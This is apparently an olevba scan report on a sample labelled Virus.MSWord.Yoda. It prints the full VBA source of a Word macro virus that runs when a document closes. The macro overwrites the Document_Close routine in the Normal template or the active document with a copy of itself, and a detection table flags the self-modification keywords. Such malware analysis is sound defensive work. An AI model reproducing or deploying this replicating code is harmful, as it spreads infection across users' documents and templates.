olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Yoda
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Yoda - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
'QXYZ
Dim linex As New Collection
On Error Resume Next
If MacroContainer Is NormalTemplate Then
Set t = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
ElseIf MacroContainer Is ActiveDocument Then
Set t = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
Else
t = ""
End If
If t <> "" And Not isme Then
isme = False: For i = 1 To t.CountOfLines: If t.lines(i, 1) = "'QXYZ" Then isme = True
Next
f = 0: i = 1
While f <> 2 And i <= t.CountOfLines
If t.lines(i, 1) = "Private Sub Document_Close()" Then f = 1
If f = 1 And t.lines(i, 1) = "End Sub" Then t.DeleteLines i, 1: i = i - 1: f = False: f = 2
If f = 1 Then t.DeleteLines i, 1: i = i - 1
i = i + 1
Wend
For i = 1 To MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
linex.Add CStr(MacroContainer.VBProject.VBComponents.Item(1).CodeModule.lines(i, 1)), "L" & i
Next
For i = 1 To MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
t.InsertLines i, linex("L" & i)
Next
End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

